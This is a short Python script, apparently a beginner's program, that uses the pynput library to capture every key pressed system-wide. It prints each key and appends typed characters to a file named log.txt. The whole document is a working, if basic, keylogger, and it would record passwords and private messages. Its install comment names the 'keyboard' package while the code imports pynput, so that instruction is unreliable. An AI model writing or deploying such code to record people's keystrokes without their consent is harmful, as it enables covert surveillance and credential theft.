# This should be a header for description of the program
# REQUIRED: pip install keyboard with cmd prompt (standard, doesn't need admin permission)

from pynput import keyboard


def keyLogged(key):
    # arg is the key pressed
    print(str(key))
    with open("log.txt", 'a') as logFile:  # create log.txt file & append with every inputted char
        try:
            inp = key.char  # get input
            logFile.write(inp)  # append log file with input
        except:
            print("N/A")


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyLogged)  # call method above when a key is pressed
    listener.start()
    input()
